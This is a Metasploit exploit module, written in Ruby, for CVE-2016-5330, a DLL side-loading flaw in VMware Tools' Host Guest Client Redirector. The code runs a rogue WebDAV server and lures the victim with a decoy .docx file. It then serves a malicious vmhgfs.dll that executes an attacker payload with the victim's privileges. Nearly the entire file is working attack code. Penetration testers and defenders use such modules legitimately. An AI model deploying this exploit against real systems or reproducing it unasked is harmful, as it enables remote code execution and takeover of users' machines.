 
class MetasploitModule < Msf::Exploit::Remote
  Rank = NormalRanking
 
  include Msf::Exploit::Remote::HttpServer::HTML
  include Msf::Exploit::EXE
 
  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;DLL Side Loading Vulnerability in VMware Host Guest Client Redirector&#039;,
      &#039;Description&#039;    => %q{
      A DLL side loading vulnerability was found in the VMware Host Guest Client Redirector,
      a component of VMware Tools. This issue can be exploited by luring a victim into
      opening a document from the attacker&#039;s share. An attacker can exploit this issue to
      execute arbitrary code with the privileges of the target user. This can potentially
      result in the attacker taking complete control of the affected system. If the WebDAV
      Mini-Redirector is enabled, it is possible to exploit this issue over the internet.
      },
      &#039;Author&#039;         => &#039;Yorick Koster&#039;,
      &#039;License&#039;        => MSF_LICENSE,
      &#039;References&#039;     =>
        [
          [&#039;CVE&#039;, &#039;2016-5330&#039;],
          [&#039;URL&#039;, &#039;https://securify.nl/advisory/SFY20151201/dll_side_loading_vulnerability_in_vmware_host_guest_client_redirector.html&#039;],
          [&#039;URL&#039;, &#039;http://www.vmware.com/in/security/advisories/VMSA-2016-0010.html&#039;],
        ],
      &#039;DefaultOptions&#039; =>
        {
          &#039;EXITFUNC&#039; => &#039;thread&#039;
        },
      &#039;Payload&#039;        => { &#039;Space&#039; => 2048, },
      &#039;Platform&#039;       => &#039;win&#039;,
      &#039;Targets&#039;        =>
        [
          [ &#039;Windows x64&#039;, {&#039;Arch&#039; => ARCH_X64,} ],
          [ &#039;Windows x86&#039;, {&#039;Arch&#039; => ARCH_X86,} ]
        ],
      &#039;Privileged&#039;     => false,
      &#039;DisclosureDate&#039; => &#039;Aug 5 2016&#039;,
      &#039;DefaultTarget&#039;  => 0))
 
    register_options(
      [
        OptPort.new(&#039;SRVPORT&#039;,     [ true, "The daemon port to listen on (do not change)", 80 ]),
        OptString.new(&#039;URIPATH&#039;,   [ true, "The URI to use (do not change)", "/" ]),
        OptString.new(&#039;BASENAME&#039;,  [ true, "The base name for the docx file", "Document1" ]),
        OptString.new(&#039;SHARENAME&#039;, [ true, "The name of the top-level share", "documents" ])
      ], self.class)
 
    # no SSL
    deregister_options(&#039;SSL&#039;, &#039;SSLVersion&#039;, &#039;SSLCert&#039;)
  end
 
 
  def on_request_uri(cli, request)
    case request.method
    when &#039;OPTIONS&#039;
      process_options(cli, request)
    when &#039;PROPFIND&#039;
      process_propfind(cli, request)
    when &#039;GET&#039;
      process_get(cli, request)
    else
      print_status("#{request.method} => 404 (#{request.uri})")
      resp = create_response(404, "Not Found")
      resp.body = ""
      resp[&#039;Content-Type&#039;] = &#039;text/html&#039;
      cli.send_response(resp)
    end
  end
 
 
  def process_get(cli, request)
    myhost = (datastore[&#039;SRVHOST&#039;] == &#039;0.0.0.0&#039;) ? Rex::Socket.source_address(cli.peerhost) : datastore[&#039;SRVHOST&#039;]
    webdav = "\\\\#{myhost}\\"
 
    if (request.uri =~ /vmhgfs\.dll$/i)
      print_status("GET => DLL Payload (#{request.uri})")
      return if ((p = regenerate_payload(cli)) == nil)
      data = generate_payload_dll({ :arch => target[&#039;Arch&#039;], :code => p.encoded })
      send_response(cli, data, { &#039;Content-Type&#039; => &#039;application/octet-stream&#039; })
      return
    end
 
    if (request.uri =~ /\.docx$/i)
      print_status("GET => DOCX (#{request.uri})")
      send_response(cli, "", { &#039;Content-Type&#039; => &#039;application/vnd.openxmlformats-officedocument.wordprocessingml.document&#039; })
      return
    end
 
    if (request.uri[-1,1] == "/" or request.uri =~ /index\.html?$/i)
      print_status("GET => REDIRECT (#{request.uri})")
      resp = create_response(200, "OK")
      resp.body = %Q|<html><head><meta http-equiv="refresh" content="0;URL=file:\\\\#{@exploit_unc}#{datastore[&#039;SHARENAME&#039;]}\\#{datastore[&#039;BASENAME&#039;]}.docx"></head><body></body></html>|
      resp[&#039;Content-Type&#039;] = &#039;text/html&#039;
      cli.send_response(resp)
      return
    end
 
    print_status("GET => 404 (#{request.uri})")
    resp = create_response(404, "Not Found")
    resp.body = ""
    cli.send_response(resp)
  end
 
  #
  # OPTIONS requests sent by the WebDav Mini-Redirector
  #
  def process_options(cli, request)
    print_status("OPTIONS #{request.uri}")
    headers = {
      &#039;MS-Author-Via&#039; => &#039;DAV&#039;,
      &#039;DASL&#039;          => &#039;<DAV:sql>&#039;,
      &#039;DAV&#039;           => &#039;1, 2&#039;,
      &#039;Allow&#039;         => &#039;OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH&#039;,
      &#039;Public&#039;        => &#039;OPTIONS, TRACE, GET, HEAD, COPY, PROPFIND, SEARCH, LOCK, UNLOCK&#039;,
      &#039;Cache-Control&#039; => &#039;private&#039;
    }
    resp = create_response(207, "Multi-Status")
    headers.each_pair {|k,v| resp[k] = v }
    resp.body = ""
    resp[&#039;Content-Type&#039;] = &#039;text/xml&#039;
    cli.send_response(resp)
  end
 
  #
  # PROPFIND requests sent by the WebDav Mini-Redirector
  #
  def process_propfind(cli, request)
    path = request.uri
    print_status("PROPFIND #{path}")
    body = &#039;&#039;
 
    my_host   = (datastore[&#039;SRVHOST&#039;] == &#039;0.0.0.0&#039;) ? Rex::Socket.source_address(cli.peerhost) : datastore[&#039;SRVHOST&#039;]
    my_uri    = "http://#{my_host}/"
 
    if path !~ /\/$/
 
      if blacklisted_path?(path)
        print_status "PROPFIND => 404 (#{path})"
        resp = create_response(404, "Not Found")
        resp.body = ""
        cli.send_response(resp)
        return
      end
 
      if path.index(".")
        print_status "PROPFIND => 207 File (#{path})"
        body = %Q|<?xml version="1.0" encoding="utf-8"?>
<D:multistatus xmlns:D="DAV:" xmlns:b="urn:uuid:c2f41010-65b3-11d1-a29f-00aa00c14882/">
<D:response xmlns:lp1="DAV:" xmlns:lp2="http://apache.org/dav/props/">
<D:href>#{path}</D:href>
<D:propstat>
<D:prop>
<lp1:resourcetype/>
<lp1:creationdate>#{gen_datestamp}</lp1:creationdate>
<lp1:getcontentlength>#{rand(0x100000)+128000}</lp1:getcontentlength>
<lp1:getlastmodified>#{gen_timestamp}</lp1:getlastmodified>
<lp1:getetag>"#{"%.16x" % rand(0x100000000)}"</lp1:getetag>
<lp2:executable>T</lp2:executable>
<D:supportedlock>
<D:lockentry>
<D:lockscope><D:exclusive/></D:lockscope>
<D:locktype><D:write/></D:locktype>
</D:lockentry>
<D:lockentry>
<D:lockscope><D:shared/></D:lockscope>
<D:locktype><D:write/></D:locktype>
</D:lockentry>
</D:supportedlock>
<D:lockdiscovery/>
<D:getcontenttype>application/octet-stream</D:getcontenttype>
</D:prop>
<D:status>HTTP/1.1 200 OK</D:status>
</D:propstat>
</D:response>
</D:multistatus>
|
        # send the response
        resp = create_response(207, "Multi-Status")
        resp.body = body
        resp[&#039;Content-Type&#039;] = &#039;text/xml; charset="utf8"&#039;
        cli.send_response(resp)
        return
      else
        print_status "PROPFIND => 301 (#{path})"
        resp = create_response(301, "Moved")
        resp["Location"] = path + "/"
        resp[&#039;Content-Type&#039;] = &#039;text/html&#039;
        cli.send_response(resp)
        return
      end
    end
 
    print_status "PROPFIND => 207 Directory (#{path})"
    body = %Q|<?xml version="1.0" encoding="utf-8"?>
<D:multistatus xmlns:D="DAV:" xmlns:b="urn:uuid:c2f41010-65b3-11d1-a29f-00aa00c14882/">
<D:response xmlns:lp1="DAV:" xmlns:lp2="http://apache.org/dav/props/">
<D:href>#{path}</D:href>
<D:propstat>
<D:prop>
<lp1:resourcetype><D:collection/></lp1:resourcetype>
<lp1:creationdate>#{gen_datestamp}</lp1:creationdate>
<lp1:getlastmodified>#{gen_timestamp}</lp1:getlastmodified>
<lp1:getetag>"#{"%.16x" % rand(0x100000000)}"</lp1:getetag>
<D:supportedlock>
<D:lockentry>
<D:lockscope><D:exclusive/></D:lockscope>
<D:locktype><D:write/></D:locktype>
</D:lockentry>
<D:lockentry>
<D:lockscope><D:shared/></D:lockscope>
<D:locktype><D:write/></D:locktype>
</D:lockentry>
</D:supportedlock>
<D:lockdiscovery/>
<D:getcontenttype>httpd/unix-directory</D:getcontenttype>
</D:prop>
<D:status>HTTP/1.1 200 OK</D:status>
</D:propstat>
</D:response>
|
 
    if request["Depth"].to_i > 0
      trail = path.split("/")
      trail.shift
      case trail.length
      when 0
        body << generate_shares(path)
      when 1
        body << generate_files(path)
      end
    else
      print_status "PROPFIND => 207 Top-Level Directory"
    end
 
    body << "</D:multistatus>"
 
    body.gsub!(/\t/, &#039;&#039;)
 
    # send the response
    resp = create_response(207, "Multi-Status")
    resp.body = body
    resp[&#039;Content-Type&#039;] = &#039;text/xml; charset="utf8"&#039;
    cli.send_response(resp)
  end
 
  def generate_shares(path)
    share_name = datastore[&#039;SHARENAME&#039;]
%Q|
<D:response xmlns:lp1="DAV:" xmlns:lp2="http://apache.org/dav/props/">
<D:href>#{path}#{share_name}/</D:href>
<D:propstat>
<D:prop>
<lp1:resourcetype><D:collection/></lp1:resourcetype>
<lp1:creationdate>#{gen_datestamp}</lp1:creationdate>
<lp1:getlastmodified>#{gen_timestamp}</lp1:getlastmodified>
<lp1:getetag>"#{"%.16x" % rand(0x100000000)}"</lp1:getetag>
<D:supportedlock>
<D:lockentry>
<D:lockscope><D:exclusive/></D:lockscope>
<D:locktype><D:write/></D:locktype>
</D:lockentry>
<D:lockentry>
<D:lockscope><D:shared/></D:lockscope>
<D:locktype><D:write/></D:locktype>
</D:lockentry>
</D:supportedlock>
<D:lockdiscovery/>
<D:getcontenttype>httpd/unix-directory</D:getcontenttype>
</D:prop>
<D:status>HTTP/1.1 200 OK</D:status>
</D:propstat>
</D:response>
|
  end
 
  def generate_files(path)
    trail = path.split("/")
    return "" if trail.length < 2
 
    %Q|
<D:response xmlns:lp1="DAV:" xmlns:lp2="http://apache.org/dav/props/">
<D:href>#{path}#{datastore[&#039;BASENAME&#039;]}.docx</D:href>
<D:propstat>
<D:prop>
<lp1:resourcetype/>
<lp1:creationdate>#{gen_datestamp}</lp1:creationdate>
<lp1:getcontentlength>#{rand(0x10000)+120}</lp1:getcontentlength>
<lp1:getlastmodified>#{gen_timestamp}</lp1:getlastmodified>
<lp1:getetag>"#{"%.16x" % rand(0x100000000)}"</lp1:getetag>
<lp2:executable>T</lp2:executable>
<D:supportedlock>
<D:lockentry>
<D:lockscope><D:exclusive/></D:lockscope>
<D:locktype><D:write/></D:locktype>
</D:lockentry>
<D:lockentry>
<D:lockscope><D:shared/></D:lockscope>
<D:locktype><D:write/></D:locktype>
</D:lockentry>
</D:supportedlock>
<D:lockdiscovery/>
<D:getcontenttype>application/octet-stream</D:getcontenttype>
</D:prop>
<D:status>HTTP/1.1 200 OK</D:status>
</D:propstat>
</D:response>
|
  end
 
  def gen_timestamp(ttype=nil)
    ::Time.now.strftime("%a, %d %b %Y %H:%M:%S GMT")
  end
 
  def gen_datestamp(ttype=nil)
    ::Time.now.strftime("%Y-%m-%dT%H:%M:%SZ")
  end
 
  # This method rejects requests that are known to break exploitation
  def blacklisted_path?(uri)
    return true if uri =~ /\.exe/i
    return true if uri =~ /\.(config|manifest)/i
    return true if uri =~ /desktop\.ini/i
    return true if uri =~ /lib.*\.dll/i
    return true if uri =~ /\.tmp$/i
    return true if uri =~ /(pcap|packet)\.dll/i
    false
  end
 
  def exploit
 
    myhost = (datastore[&#039;SRVHOST&#039;] == &#039;0.0.0.0&#039;) ? Rex::Socket.source_address(&#039;50.50.50.50&#039;) : datastore[&#039;SRVHOST&#039;]
 
    @exploit_unc  = "\\\\#{myhost}\\"
 
    if datastore[&#039;SRVPORT&#039;].to_i != 80 || datastore[&#039;URIPATH&#039;] != &#039;/&#039;
      fail_with(Failure::Unknown, &#039;Using WebDAV requires SRVPORT=80 and URIPATH=/&#039;)
    end
 
    print_status("Files are available at #{@exploit_unc}#{datastore[&#039;SHARENAME&#039;]}")
 
    super
  end
end

